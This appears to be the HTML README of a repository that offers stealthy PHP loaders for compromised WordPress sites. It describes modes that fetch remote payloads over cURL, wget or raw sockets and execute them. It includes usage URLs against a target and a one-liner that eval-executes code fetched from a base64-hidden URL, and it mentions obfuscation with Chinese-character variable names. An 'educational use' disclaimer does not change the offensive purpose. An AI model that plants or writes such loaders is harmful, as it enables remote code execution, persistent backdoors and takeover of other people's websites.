<!DOCTYPE html>
<html lang="en">
</head>
<body>

  <h1>🌀 WP-Loader Collection — Universal PHP Loaders</h1>
  <p><strong>🔥 Universal PHP loader collection</strong> created by 
    <a href="https://github.com/6ickzone" target="_blank">0x6ick</a>.  
    This repository contains different types of loaders (multi-mode, one-liner, stealth) designed to fetch and execute remote payloads.</p>

  <p><strong>⚠️ Disclaimer:</strong> This tool is provided for educational and research purposes only.  
  Any misuse or illegal activity is not the responsibility of the author.</p>

  <hr>

  <div class="section">
    <h2>📂 Repository Structure</h2>
    <pre><code>/loader/wp-loader.php    # Main multi-mode loader panel
/loader/b64loader.php           # One-liner base64 loader
/loader/loadman.php             # Stealth loader (cURL + file_get_contents) with Mandarin variables
</code></pre>
  </div>

  <div class="section">
    <h2>✨ Available Loaders</h2>

    <h3>1. wp-loader.php</h3>
    <p><strong>Multi-mode loader panel</strong> with the following modes:</p>
    <ul>
      <li><code>curl</code> → Loader using cURL</li>
      <li><code>curlman</code> → Refactored curl loader</li>
      <li><code>tmp</code> → Temporary file-based loader</li>
      <li><code>cache</code> → Loader with cache mechanism</li>
      <li><code>curlv2</code> → Alternative curl loader</li>
      <li><code>wget</code> → wget/curl + include method</li>
      <li><code>socket</code> → Raw socket GET loader</li>
      <li><code>telegram</code> → Author contact info</li>
    </ul>
    <p><strong>Usage:</strong></p>
    <pre><code>http://target.com/wp-loader.php?mode=curl</code></pre>

    <h3>2. b64loader.php</h3>
    <p><strong>One-liner base64 loader</strong></p>
    <ul>
      <li>Decodes a URL from base64 → fetches → executes via eval</li>
      <li>Extremely short and stealthy</li>
    </ul>
    <p><strong>Example snippet:</strong></p>
    <pre><code>&lt;?= @eval("?>".file_get_contents(base64_decode("..."))); ?&gt;</code></pre>

    <h3>3. loadman.php</h3>
    <p><strong>Stealth loader with Mandarin style</strong></p>
    <ul>
      <li>Function and variable names in Chinese characters (汉字)</li>
      <li>Flow: cURL → fallback to file_get_contents → eval</li>
      <li>Error output: "加载失败 (Failed to load)"</li>
    </ul>
    <p><strong>Usage:</strong></p>
    <pre><code>http://target.com/loadman.php</code></pre>
  </div>

  <hr>

  <div class="section">
    <h2>📜 License</h2>
    <p><a href="http://www.wtfpl.net" target="_blank">WTFPL v2</a></p>
    <pre><code>DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
Version 2, December 2004</code></pre>
  </div>

  <div class="section">
    <h2>👤 Author</h2>
    <ul>
      <li><strong>0x6ick (a.k.a 6ickzone)</strong></li>
      <li>Telegram: <a href="https://t.me/Yungx6ick" target="_blank">@Yungx6ick</a></li>
    </ul>
  </div>

</body>
</html>
